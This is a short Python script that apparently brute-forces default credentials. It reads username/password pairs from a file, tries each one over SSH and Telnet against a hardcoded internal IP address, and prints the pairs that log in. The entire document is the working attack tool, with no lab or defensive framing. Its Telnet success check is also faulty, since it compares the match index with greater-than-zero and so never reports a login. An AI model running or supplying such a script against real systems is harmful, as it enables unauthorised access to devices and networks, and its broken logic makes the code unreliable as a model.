import socket
import telnetlib

import paramiko


def SSHLogin(host, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            print(
                "SSH login successful on %s:%s with username %s and password %s"
                % (host, port, username, password))
        ssh.close()
    except:
        print("SSH login failed %s %s" % (username, password))


def TelnetLogin(host, port, username, password):
    tn = telnetlib.Telnet(host, port, timeout=1)
    tn.read_until(b"login: ")
    tn.write((username + "\n").encode("utf-8"))
    tn.read_until(b"Password: ")
    tn.write((password + "\n").encode("utf-8"))
    try:
        result = tn.expect([b"Last login"])
        if result[0] > 0:
            print(
                "Telnet login successful on %s:%s with username %s and password %s"
                % (host, port, username, password))
        tn.close()
    except (EOFError, socket.timeout):
        print("Telnet login failed %s %s" % (username, password))


host = "10.0.0.212"
sshport = 22
telnetport = 23
with open("defaults.txt", "r") as f:
    for line in f:
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host, sshport, username, password)
        TelnetLogin(host, telnetport, username, password)
